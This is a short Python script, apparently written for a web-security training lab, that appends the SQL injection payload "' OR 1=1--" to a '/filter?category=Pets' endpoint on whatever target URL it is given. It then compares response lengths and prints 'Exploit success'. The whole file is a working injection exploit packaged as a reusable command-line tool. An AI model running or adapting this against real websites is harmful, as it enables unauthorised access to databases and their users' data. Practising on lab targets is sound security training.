import requests
import urllib
import argparse
from urllib.parse import urlparse

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target url (eg: http://example.com)")
args = parser.parse_args()

url_input = urlparse(args.url)
full_url = url_input.scheme + "://" + url_input.hostname

endpoint = "/filter?category=Pets"
payload = "' OR 1=1--"

encoded_payload = urllib.parse.quote(payload, safe='')
exploited_url = full_url + endpoint + encoded_payload

def show_content_length(req):
    r = requests.get(req)
    return r.headers.get('content-length')

print("Exploiting target...")
print("-"*50)
print("Exploited URL: " + exploited_url)
print("-"*50)
print("Response's Content-Length on the original request: " + show_content_length(full_url))
print("Response's Content-Length after injected with the payload : " + show_content_length(exploited_url))
print("-"*50)
print("Exploit success!!!")